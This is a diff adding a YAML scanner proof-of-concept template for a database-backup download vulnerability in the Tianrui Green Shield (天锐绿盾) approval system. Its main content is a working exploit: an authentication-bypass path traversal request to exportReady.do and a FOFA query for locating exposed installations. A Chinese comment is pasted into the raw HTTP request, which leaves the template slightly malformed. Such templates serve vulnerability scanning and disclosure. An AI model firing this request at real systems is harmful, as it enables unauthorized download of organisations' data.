@@ -1,0 +1,23 @@
+id: poc-lylv44082an8euou
+info:
+  name: 天锐绿盾审批系统 exportReady.do 数据库备份下载漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lylv44082an8euou'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lylv44082an8euou
+    fofa: body="location.href=location.href+\"trwfe\";"||body="天锐绿盾"
+http:
+- raw:
+  - 'GET /trwfe/login.jsp/.%2e/config/exportReady.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    压缩的是整个根目录下的exports目录，因此如果目录存在其他文件也会一并压缩'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
